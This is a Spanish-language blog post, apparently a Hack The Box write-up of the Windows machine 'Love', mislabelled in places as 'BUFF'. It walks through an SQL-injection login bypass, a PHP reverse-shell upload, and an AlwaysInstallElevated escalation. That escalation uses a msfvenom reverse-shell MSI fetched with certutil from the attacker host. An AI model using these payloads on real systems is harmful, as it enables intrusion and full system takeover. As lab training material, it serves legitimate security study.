@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Love HTB Write-Up | Pirrandi</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Love HTB Write-Up" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BUFF" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BUFF" />
+<link rel="canonical" href="http://localhost:4000/2023/10/31/Love.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/31/Love.html" />
+<meta property="og:site_name" content="Pirrandi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-31T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Love HTB Write-Up" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2023-10-31T00:00:00-03:00","datePublished":"2023-10-31T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BUFF","headline":"Maquina Love HTB Write-Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/31/Love.html"},"url":"http://localhost:4000/2023/10/31/Love.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi <b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-green-hover" href="https://github.com/pirrandi"><i class="fab fa-github-square"></i></a><a class="color-green-hover" href="https://twitter.com/tucuentadetwitter"><i class="fab fa-twitter-square"></i></a><a class="color-green-hover" href="https://www.linkedin.com/in/tuperfillinkedin"><i class="fab fa-linkedin"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="https://www.hackthebox.com/storage/avatars/6bcb2b4c2931783b04d57610d49c7694.png" class="author-avatar" alt="Avatar" />
+    
+Blog personal sobre Conceptos de Hacking Etico.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Love | HTB Write-Up</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/Facil,/">Facil,</a>
+      
+      <a class="tag" href="/tag/Windows/">Windows</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 31 Oct 2023</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BUFF</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="buff--hack-the-box">BUFF ~ Hack The Box</h1>
+
+<p>Machine IP 10.10.10.198</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<blockquote>
+  <p>#tutorial: Qué información se puede obtener.</p>
+</blockquote>
+
+<p>Comienzo el escaneo de puertos y versiones con nmap:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE        VERSION
+80/tcp    open  http           Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http       Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span><span class="k">in</span>
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+445/tcp   open  microsofeH+V Windows 10 Pro 19042 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3306/tcp  open  mysql?
+5000/tcp  open  http           Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+5040/tcp  open  unknown
+5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http       Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_ssl-date: 2023-10-26T00:44:35+00:00<span class="p">;</span> +21m32s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Not Found
+7680/tcp  open  pando-pub?
+47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc          Microsoft Windows RPC
+49665/tcp open  msrpc          Microsoft Windows RPC
+49666/tcp open  msrpc          Microsoft Windows RPC
+49667/tcp open  msrpc          Microsoft Windows RPC
+49668/tcp open  msrpc          Microsoft Windows RPC
+49669/tcp open  msrpc          Microsoft Windows RPC
+49670/tcp open  msrpc          Microsoft Windows RPC
+</code></pre></div></div>
+
+<p>Ahora enumero directorios con Wfuzz:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                      
+<span class="o">=====================================================================</span>
+
+000000023:   403        9 L      30 W       298 Ch      <span class="s2">".hta"</span>      
+000000024:   403        9 L      30 W       298 Ch      <span class="s2">".htaccess"</span>
+000000025:   403        9 L      30 W       298 Ch      <span class="s2">".htpasswd"</span>   
+000000191:   301        9 L      30 W       329 Ch      <span class="s2">"ADMIN"</span>     
+000000196:   301        9 L      30 W       329 Ch      <span class="s2">"Admin"</span>      
+000000259:   301        9 L      30 W       330 Ch      <span class="s2">"Images"</span>    
+000000520:   301        9 L      30 W       329 Ch      <span class="s2">"admin"</span>     
+000000763:   403        9 L      30 W       298 Ch      <span class="s2">"aux"</span>   
+000001039:   403        9 L      30 W       298 Ch      <span class="s2">"cgi-bin/"</span>  
+000001162:   403        9 L      30 W       298 Ch      <span class="s2">"com4"</span>     
+000001159:   403        9 L      30 W       298 Ch      <span class="s2">"com1"</span>     
+000001160:   403        9 L      30 W       298 Ch      <span class="s2">"com2"</span>    
+000001161:   403        9 L      30 W       298 Ch      <span class="s2">"com3"</span>   
+000001206:   403        9 L      30 W       298 Ch      <span class="s2">"con"</span>      
+000001504:   301        9 L      30 W       328 Ch      <span class="s2">"dist"</span>       
+000002170:   301        9 L      30 W       330 Ch      <span class="s2">"images"</span>      
+000002198:   200        125 L    324 W      4388 Ch     <span class="s2">"index.php"</span>   
+000002191:   301        9 L      30 W       332 Ch      <span class="s2">"includes"</span>    
+000002457:   403        11 L     47 W       417 Ch      <span class="s2">"licenses"</span>  
+000002542:   403        9 L      30 W       298 Ch      <span class="s2">"lpt1"</span>      
+000002543:   403        9 L      30 W       298 Ch      <span class="s2">"lpt2"</span>      
+000001710:   503        11 L     44 W       398 Ch      <span class="s2">"examples"</span> 
+000002867:   403        9 L      30 W       298 Ch      <span class="s2">"nul"</span>    
+000003112:   403        9 L      30 W       298 Ch      <span class="s2">"phpmyadmin"</span>
+000003158:   301        9 L      30 W       331 Ch      <span class="s2">"plugins"</span>
+000003276:   403        9 L      30 W       298 Ch      <span class="s2">"prn"</span> 
+000003719:   403        11 L     47 W       417 Ch      <span class="s2">"server-status"</span>
+000003718:   403        11 L     47 W       417 Ch      <span class="s2">"server-info"</span>
+000004476:   403        9 L      30 W       298 Ch      <span class="s2">"webalizer"</span>
+</code></pre></div></div>
+
+<h1 id="análisis-de-vulnerabilidades">Análisis de vulnerabilidades</h1>
+
+<p>Comienzo a revisar la pagina web y me encuentro con un login.
+Intento realizar algunas SQLinjections durante un rato pero no logro llegar a nada.</p>
+
+<p><img src="https://i.imgur.com/2xaDIEy.png" alt="" /></p>
+
+<p>Asi que procedo a revisar el segundo directorio que me llama la atencion, el cual es <strong>Admin</strong>.
+Acá tambien encuentro un Login, pero con algunos cambios, por que ahora no pide un ID, pide un usuario.</p>
+
+<p><img src="https://i.imgur.com/D5qYfEt.png" alt="" /></p>
+
+<p>Vuelvo a intentar realizar SQLinjections, y tampoco logro nada, pero hay algo que me llama la atención.
+Cuando no quiero probar las SQLinjections una por una, cargo una lista en Caido que es un programa similar a Burpsuite que permite realizar ataques de fuerza bruta sin los limites de velocidad que tiene BurpSuite (sin pagar).</p>
+
+<p>Lo que hice fue crear un .txt con paylods sacados de <a href="https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass#hacktricks-cloud-twitter-twitch-youtube">HackTricks</a> y los cargo en Caido, luego intercepto la conexion con Caido (igual que BurpSuite), marco el input (username) en donde quiero cargar el payload y lo inicio:</p>
+
+<p><img src="https://i.imgur.com/u5vrtUz.png" alt="" /></p>
+
+<p>No logro bypassear el login, pero si encuentro algo que me llamo la atención.
+Y es que como respuesta por parte del servidor web estoy recibiendo dos resultados distinto en cuanto a cantidad de caracteres, 351 y 495:</p>
+
+<p><img src="https://i.imgur.com/cUogOKS.png" alt="" /></p>
+
+<p>Al revisar el de 495 veo una respuesta por parte del servidor, la cual me hace pensar que puede existir una via potencial de ejecutar un SQLinjection:</p>
+
+<p><img src="https://i.imgur.com/4scPLaJ.png" alt="" /></p>
+
+<p>Asi que enseguida procedo a investigar mas por Google. Hasta que doy con una vulnerabilidad para ByPassear el Login:</p>
+
+<p><img src="https://i.imgur.com/U76B1Tb.png" alt="" /></p>
+
+<h1 id="explotación-de-vulnerabilidades">Explotación de vulnerabilidades</h1>
+
+<p>Resumiendo, se podia realizar una inyeccion SQL, pero era mas compleja que las inyecciones que estaba intentando yo. Esta es la que termine utilizando para lograr el ByPass:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">login</span><span class="o">=</span>yea&amp;password<span class="o">=</span>admin&amp;username<span class="o">=</span>dsfgdf<span class="s1">' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
+</span></code></pre></div></div>
+
+<p>Asi que ahora solo queda interceptar la peticion nuevamente e inyectar el payload.</p>
+
+<p><img src="https://i.imgur.com/SJVMNJz.png" alt="" /></p>
+
+<p>De ahi en más, solamente aprete <strong>Forward</strong> unas 3 veces para lograr ingresar.</p>
+
+<p><img src="https://i.imgur.com/wNaZ41k.png" alt="" /></p>
+
+<p>Ahora me quedaba encontrar algun fallo en el sistema para ver si podia lograr algo desde el panel.</p>
+
+<p>Cuando me puse a buscar en Google vulnerabilidades, me di cuenta de que estaba <a href="https://www.exploit-db.com/exploits/49846">este RCE</a> que pedia autenticación, asi que fui a revisarlo.</p>
+
+<p>El script pedia los datos del usuario administrador para ejecutar codigo.</p>
+
+<blockquote>
+  <p>De aqui en adelante he visto que otros usuarios de HTB toman otra via para encontrar las credenciales de Admin y ejecutar la vulnerabilidad, viendo el puerto 5000 a tres de otra pagina con subdomino. Esto no lo hice, ya que no me percate de que podia existir un subdominio en este momento. Entiendo que esta vulnerabilidad estaba prevista para ejecutarse con este payload, pero quizá no de la manera que yo lo hice.</p>
+</blockquote>
+
+<p>Pero leyendo el codigo me di cuenta de que simplemente se podia hacer estando logeado desde la misma interfaz.</p>
+
+<p>Fui al apartado de <strong>Voters</strong> y agregue uno nuevo. Rellene los datos y en el apartado de <strong>Photo</strong> cargue un script <strong>PHP</strong>:</p>
+
+<blockquote>
+  <p>FAIL: Acá igual me lleve un rato probando scripts, ya que el que estaba documentado en exploit-db no funciono, y tambien estuve probando otros (como se ve en la imagen).</p>
+</blockquote>
+
+<p><img src="https://i.imgur.com/pBjnYW7.png" alt="" /></p>
+
+<p>El exploit que use es el de Ivan Sincek, puedes <a href="https://github.com/ivan-sincek/php-reverse-shell">verlo acá</a>, o puedes hacerlo como yo que simplemente lo saque <a href="https://www.revshells.com/">revshells.com</a>, en el apartado de Windows.</p>
+
+<p>Luego lo que quedaba era ejecutar el script PHP, en el codigo se puede ver que lo carga desde el directorio <strong>images</strong> simplemente abriendolo desde la URL.</p>
+
+<p>Asi que pongo en escucha el netcat e ingreso a la URL:</p>
+
+<p><img src="https://i.imgur.com/syIWCX3.png" alt="" /></p>
+
+<p><strong>SHELL OBTENIDA.</strong></p>
+
+<p>Ahora busco la User Flag y continuo con la escala de privilegio.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nvlp</span> 4545
+listening on <span class="o">[</span>any] 4545 ...
+connect to <span class="o">[</span>10.10.14.7] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239] 63812
+SOCKET: Shell has connected! PID: 2448
+Microsoft Windows <span class="o">[</span>Version 10.0.19042.867]
+<span class="o">(</span>c<span class="o">)</span> 2020 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;whoami
+love<span class="se">\p</span>hoebe
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;cd C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
+
+C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
+
+04/13/2021  03:20 AM    &lt;DIR&gt;          <span class="nb">.</span>
+04/13/2021  03:20 AM    &lt;DIR&gt;          ..
+10/25/2023  05:33 PM                34 user.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   3,856,453,632 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt;type usr.txt
+The system cannot find the file specified.
+
+C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt;type user.txt
+c7b85e76<span class="k">**************************</span>
+</code></pre></div></div>
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Lo primero que hago es hacer un <code class="language-plaintext highlighter-rouge">whoami /priv</code> pero no veo nada interesante.
+Asi que descargo winPEAS y lo transfiero a la maquina Windows:</p>
+
+<p><img src="https://i.imgur.com/91ZVNRy.png" alt="" /></p>
+
+<blockquote>
+  <p>FAIL: En este punto no sabia que podia hacer, por mi desconocimiento hackeando Windows, asi que me pongo a probar diferentes cosas como JuicyPotato para escalar privilegios, pero no logro dar con nada.</p>
+</blockquote>
+
+<p>Buscando alguna ayuda me informo de que <strong>AlwaysInstallElevated</strong> al estar seteado en 1 tanto en <strong>HKLM</strong> como en <strong>HMCU</strong> podemos sacar provecho para escalar privilegio.
+(Esto se puede ver utilizando winPEAS.)</p>
+
+<p>Al parecer se puede crear un .MSI con Msfvenom para escalar privilegios.</p>
+
+<p>Entonces hago un exploit Reverse Shell con un archivo .msi</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.29 <span class="nv">LPORT</span><span class="o">=</span>4321 <span class="nt">--platform</span> windows <span class="nt">-a</span> x64 <span class="nt">-f</span> msi <span class="nt">-o</span> reverse2.msi
+</code></pre></div></div>
+
+<p>Ahora debo subirlo a Windows abriendo un servidor Python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Y descargandolo desde Windows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.7/reverse2.msi
+</code></pre></div></div>
+
+<p>Ahora me pongo en escucha por el puerto 4321 con NetCat:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 4321
+</code></pre></div></div>
+
+<p>y ejecuto el .MSI con:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /quiet /qn /i reverse2.msi
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/ntu3hWv.png" alt="" /></p>
+
+<p><strong>ROOT SHELL OBTENIDA.</strong></p>
+
+<p>Ahora solo me queda ir por la Root Flag:</p>
+
+<p>```bash
+C:\WINDOWS\system32&gt;whoami
+whoami
+nt authority\system</p>
+
+<p>C:\WINDOWS\system32&gt;cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop</p>
+
+<p>C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30</p>
+
+<p>Directory of C:\Users\Administrator\Desktop</p>
+
+<p>04/13/2021  03:20 AM    <DIR>          .
+04/13/2021  03:20 AM    <DIR>          ..
+10/25/2023  05:33 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   3,850,883,072 bytes free</DIR></DIR></p>
+
+<p>C:\Users\Administrator\Desktop&gt;type root.txt  <br />
+type root.txt
+1bd72aa6<strong>**</strong><strong>**</strong><strong>**</strong>*```</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2023/10/31/Love.html';
+     this.page.identifier = '/2023/10/31/Love';
+     this.page.title = 'Maquina Love | HTB Write-Up';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/10/31/CozyHosting.html">
+            Maquina CozyHosting | HTB Write-Up
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Timelapse.html">
+            Maquina Timelapse | HTB Write-Up
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BUFF';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
